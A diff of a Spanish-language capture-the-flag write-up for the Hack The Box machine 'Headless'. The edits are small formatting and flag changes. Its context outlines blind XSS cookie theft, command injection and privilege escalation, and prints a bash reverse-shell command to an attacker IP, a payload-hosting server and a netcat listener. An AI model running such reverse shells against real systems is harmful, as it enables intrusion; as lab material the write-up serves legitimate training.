@@ -2,7 +2,8 @@
 title: Headless
 description: Headless es una máquina de dificultad fácil con Linux que cuenta con un servidor Python Werkzeug que aloja un sitio web. El sitio web tiene un formulario de soporte al cliente, el cual resulta ser vulnerable a blind Cross-Site Scripting (XSS) a través del encabezado User-Agent. Esta vulnerabilidad se utiliza para robar una cookie de administrador, que luego se usa para acceder al panel de administración. La página es vulnerable a inyecciones de comandos, lo que permite obtener un shell inverso en la máquina. Al enumerar el correo del usuario, se descubre un script que no utiliza rutas absolutas, lo cual se aprovecha para obtener un shell con privilegios de 'root'.
 date: 2024-05-24
-classes: wide
+toc: true
+pin: false
 image:
  path: /assets/img/htb-writeup-headless/headless_logo.png
 categories:
@@ -17,7 +18,7 @@ tags:
 ## Information Gathering
 
 ```terminal
-/home/kali/Documents/htb/machines/headless:-$ sudo nmap -sC -sV 10.10.11.8
+/home/kali/Documents/htb/machines/headless:-$ sudo nmap -sC -sV -p- 10.10.11.8
 ```
 
 ![](/assets/img/htb-writeup-headless/headless1.png)
@@ -74,6 +75,7 @@ Consigo autentificarme exitosamente.
 ![](/assets/img/htb-writeup-headless/headless7.png)
 
 Analizando la peticion 'POST', encuentro que es vulnerable a OS Command Injection.
+
 Creo una reverse shell y monto un servidor para que la maquina victima descarge el payload.
 ```terminal
 /home/kali/Documents/htb/machines/headless:-$ echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.16.59/4444 0>&1'" > payload.sh
@@ -81,7 +83,7 @@ Creo una reverse shell y monto un servidor para que la maquina victima descarge 
 /home/kali/Documents/htb/machines/headless:-$ python3 -m http.server 8001
 	Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 ```
-Me pongo en escucha con netcat e injecto el comando malisioso por burpsuite.
+Me pongo en escucha con Netcat e injecto el comando malisioso por Burpsuite.
 ```terminal
 /home/kali/Documents/htb/machines/headless:-$ nc -nvlp 4444 
 	listening on [any] 4444 ...
